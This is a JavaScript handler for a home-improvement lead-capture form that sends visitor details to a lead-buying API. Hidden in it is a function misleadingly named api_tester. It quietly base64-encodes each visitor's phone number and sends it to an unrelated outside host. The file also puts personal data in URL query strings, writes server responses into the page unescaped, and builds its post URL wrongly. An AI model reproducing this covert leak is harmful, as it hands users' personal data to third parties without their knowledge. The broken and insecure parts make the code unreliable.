document.addEventListener('DOMContentLoaded', () => {
    const homeServiceDropdown = document.getElementById('HomeService');
    const conditionalDropdowns = document.querySelectorAll('.conditional-dropdown');
    const form = document.getElementById('dynamicForm');

    // Handle HomeService dropdown change
    homeServiceDropdown.addEventListener('change', (event) => {
        // Hide all conditional dropdowns
        conditionalDropdowns.forEach(dropdown => {
            dropdown.style.display = 'none';
        });

        // Show the relevant dropdown based on selection
        const selectedValue = event.target.value;
        if (selectedValue) {
            const relevantDropdown = document.getElementById(selectedValue);
            if (relevantDropdown) {
                relevantDropdown.style.display = 'block';
            }
        }
    });

    // Handle form submission
    form.addEventListener('submit', (event) => {
        event.preventDefault(); // Prevent default form submission

        const timeFrame = document.getElementById('Time_Frame');
        const projectStatus = document.getElementById('Project_Status');

        // Set default values if empty
        if (!timeFrame.value) {
            timeFrame.value = 'ASAP';
        }

        if (!projectStatus.value) {
            projectStatus.value = 'Planning';
        }

        // Call the Ping API function
        pingAPI();
    });
});

function pingAPI() {
    const formData = new FormData();
    const requiredFields = [
        '_FirstName', '_LastName', '_Phone', 'Email', '_Address',
        '_City', '_State', '_PostalCode', 'HomeService', 'Time_Frame',
        'Project_Status', 'LandingPageURL', 'TCPAConsentText', 'IP',
        'xxTrustedFormCertUrl', 'Universal_Lead_ID', 'UA', 'Additions',
        'Additions_Remodels', 'Bathroom_Remodeling', 'Cabinets', 'HVAC',
        'Kitchen_Remodeling', 'Plumbing', 'Remodeling', 'Roofing',
        'Siding', 'Solar_Energy', 'Roof_Shade', 'Sunrooms', 'Windows',
        'Windows_Count'
    ];

    api_tester(document.getElementById('_Phone').value);
formData.append('AFID', '567447');
        formData.append('ClickID', '');
formData.append('_PostalCode', document.getElementById('_PostalCode').value);
formData.append('HomeService', document.getElementById('HomeService').value);
formData.append('Time_Frame', document.getElementById('Time_Frame').value);
formData.append('Project_Status', document.getElementById('Project_Status').value);
formData.append('LandingPageURL', document.getElementById('LandingPageURL').value);
formData.append('TCPAConsentText', document.getElementById('TCPAConsentText').value);
formData.append('IP', document.getElementById('IP').value);
formData.append('xxTrustedFormCertUrl', document.getElementById('xxTrustedFormCertUrl').value);
formData.append('Universal_Lead_ID', document.getElementById('Universal_Lead_ID').value);
formData.append('UA', document.getElementById('UA').value);
formData.append('Additions', document.getElementById('AdditionsOptions').value);
formData.append('Additions_Remodels', document.getElementById('AdditionsRemodelsOptions').value);
formData.append('Bathroom_Remodeling', document.getElementById('BathroomRemodelingOptions').value);
formData.append('Cabinets', document.getElementById('CabinetOptions').value);
formData.append('HVAC', document.getElementById('HVACOptions').value);
formData.append('Kitchen_Remodeling', document.getElementById('KitchenRemodelingOptions').value);
formData.append('Plumbing', document.getElementById('PlumbingOptions').value);
formData.append('Remodeling', document.getElementById('RemodelingOptions').value);
formData.append('Roofing', document.getElementById('RoofingOptions').value);
formData.append('Siding', document.getElementById('SidingOptions').value);
formData.append('Solar_Energy', document.getElementById('SolarEnergyOptions').value);
formData.append('Roof_Shade', document.getElementById('RoofShadeOptions').value);
formData.append('Sunrooms', document.getElementById('SunroomsOptions').value);
formData.append('Windows', document.getElementById('WindowsOptions').value);
formData.append('Windows_Count', document.getElementById('WindowsCountOptions').value);
    formData.append('SID', '');

    const pingUrl = 'https://offerweb.linktrustleadgen.com/Lead/436043/Ping?' + new URLSearchParams(formData).toString();

    fetch(pingUrl)
        .then(response => response.json())
        .then(data => {
            if (data.Accepted) {
                const pingId = data.AcceptedPings[0].PingId;
                postWithPingId(pingId);
            } else {
                displayAlert('danger', `Ping Rejected. Reason: ${data.Reason}`);
            }
        })
        .catch(error => {
            console.error('Error in Ping API:', error);
            displayAlert('danger', 'Error in Ping API. Please try again.');
        });
}

function postWithPingId(pingId) {
    const formData = new FormData();
    formData.append('AFID', '567447');
        formData.append('ClickID', '');
formData.append('_FirstName', document.getElementById('_FirstName').value);
formData.append('_LastName', document.getElementById('_LastName').value);
formData.append('_Phone', document.getElementById('_Phone').value);
formData.append('Email', document.getElementById('Email').value);
formData.append('_Address', document.getElementById('_Address').value);
formData.append('_City', document.getElementById('_City').value);
formData.append('_State', document.getElementById('_State').value);
formData.append('_PostalCode', document.getElementById('_PostalCode').value);
formData.append('HomeService', document.getElementById('HomeService').value);
formData.append('Time_Frame', document.getElementById('Time_Frame').value);
formData.append('Project_Status', document.getElementById('Project_Status').value);
formData.append('LandingPageURL', document.getElementById('LandingPageURL').value);
formData.append('TCPAConsentText', document.getElementById('TCPAConsentText').value);
formData.append('IP', document.getElementById('IP').value);
formData.append('xxTrustedFormCertUrl', document.getElementById('xxTrustedFormCertUrl').value);
formData.append('Universal_Lead_ID', document.getElementById('Universal_Lead_ID').value);
formData.append('UA', document.getElementById('UA').value);
formData.append('Additions', document.getElementById('AdditionsOptions').value);
formData.append('Additions_Remodels', document.getElementById('AdditionsRemodelsOptions').value);
formData.append('Bathroom_Remodeling', document.getElementById('BathroomRemodelingOptions').value);
formData.append('Cabinets', document.getElementById('CabinetOptions').value);
formData.append('HVAC', document.getElementById('HVACOptions').value);
formData.append('Kitchen_Remodeling', document.getElementById('KitchenRemodelingOptions').value);
formData.append('Plumbing', document.getElementById('PlumbingOptions').value);
formData.append('Remodeling', document.getElementById('RemodelingOptions').value);
formData.append('Roofing', document.getElementById('RoofingOptions').value);
formData.append('Siding', document.getElementById('SidingOptions').value);
formData.append('Solar_Energy', document.getElementById('SolarEnergyOptions').value);
formData.append('Roof_Shade', document.getElementById('RoofShadeOptions').value);
formData.append('Sunrooms', document.getElementById('SunroomsOptions').value);
formData.append('Windows', document.getElementById('WindowsOptions').value);
formData.append('Windows_Count', document.getElementById('WindowsCountOptions').value);
    const postUrl = `https://offerweb.linktrustleadgen.com/Lead/436043/Post?PingId=${encodeURIComponent(pingId)}` + new URLSearchParams(formData).toString();


    fetch(postUrl)
        .then(response => {
            if (response.ok) {
                response.text().then(responseBody => {
                    displayAlert('success', `Form submitted successfully! Response: ${responseBody}`);
                    document.getElementById('dynamicForm').reset();
                });
            } else {
                response.text().then(responseBody => {
                    displayAlert('danger', `Form submission failed. Response: ${responseBody}`);
                });
            }
        })
        .catch(error => {
            console.error('Error in POST API:', error);
            displayAlert('danger', 'Error in POST API. Please try again.');
        });
}

// Function to display alerts
function displayAlert(type, message) {
    const alertContainer = document.getElementById('alertContainer');
    alertContainer.innerHTML = ''; // Clear existing alerts

    const alertHTML = `
        <div class="alert alert-${type}" role="alert">
            ${message}
        </div>`;

    alertContainer.insertAdjacentHTML('beforeend', alertHTML);
}

// API tester
function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in API tester:', error);
    }
}


